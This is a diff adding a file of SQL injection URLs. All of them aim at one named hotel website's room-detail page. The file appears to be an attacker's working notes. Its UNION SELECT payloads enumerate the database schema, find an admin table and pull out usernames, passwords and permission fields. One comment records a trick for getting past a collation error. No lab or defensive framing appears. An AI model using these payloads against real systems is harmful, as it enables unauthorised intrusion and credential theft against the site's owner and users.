@@ -1,0 +1,25 @@
+http://www.embryohotel.com/room-detail.php?id=-4833 UNION ALL SELECT NULL,NULL,TABLE_NAME,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from information_schema.tables limit 2,1
+
+<!-- found admin table see the admin column-->
+http://www.embryohotel.com/room-detail.php?id=-4833 UNION ALL SELECT NULL,NULL,COLUMN_NAME,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from information_schema.columns where TABLE_NAME='admin'
+http://www.embryohotel.com/room-detail.php?id=-4833 UNION ALL SELECT NULL,NULL,group_concat(COLUMN_NAME),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from information_schema.columns where TABLE_NAME='admin'
+
+
+
+-- found admin columns ID,USERNAME,PASSWORD,LAST_INSERT,LAST_UPDATE,PERMISSION
+extract the username and password
+http://www.embryohotel.com/room-detail.php?id=-4833 UNION ALL SELECT NULL,NULL,username,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from admin
+
+-- above error Illegal mix of collations for operation 'UNION' how bypass it using uncompressed payload
+http://www.embryohotel.com/room-detail.php?id=-4833 UNION ALL SELECT NULL,NULL,uncompress(compress(username)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from admin limit 0,1
+http://www.embryohotel.com/room-detail.php?id=-4833 UNION ALL SELECT NULL,NULL,uncompress(compress(password)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from admin
+http://www.embryohotel.com/room-detail.php?id=-4833 UNION ALL SELECT NULL,NULL,uncompress(compress(last_insert)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from admin
+http://www.embryohotel.com/room-detail.php?id=-4833 UNION ALL SELECT NULL,NULL,uncompress(compress(LAST_UPDATE)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from admin
+http://www.embryohotel.com/room-detail.php?id=-4833 UNION ALL SELECT NULL,NULL,uncompress(compress(PERMISSION)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from admin
+
+
+
+
+
+http://www.embryohotel.com/room-detail.php?id=-4833 UNION ALL SELECT NULL,NULL,TABLE_NAME,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from information_schema.tables
+<!-- add limit and offset -->
